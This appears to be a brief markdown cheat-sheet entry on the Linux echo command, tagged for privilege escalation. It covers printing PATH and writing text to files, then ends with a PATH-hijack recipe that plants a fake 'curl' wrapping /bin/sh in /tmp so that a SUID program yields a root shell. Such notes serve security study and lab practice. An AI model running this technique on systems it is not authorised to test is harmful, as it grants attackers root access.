---
title: Echo
desc: In addition to the output of string, there are other uses such as the privileges escalation.
tags: [Linux, PrivEsc]
alts: []
website:
---

## Directories specified by PATH

```sh
echo $PATH
```

## Add text to file

```sh
# Add text
echo "Hello World" >> sample.txt

# Overwrite (original contents disappears)
echo "Hello World" > sample.txt

# Enable escape
echo -e "Hello\nWorld" > sample.txt
```

## Root privilege

```sh
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH

# Some SUID command...

# Then you are root user
```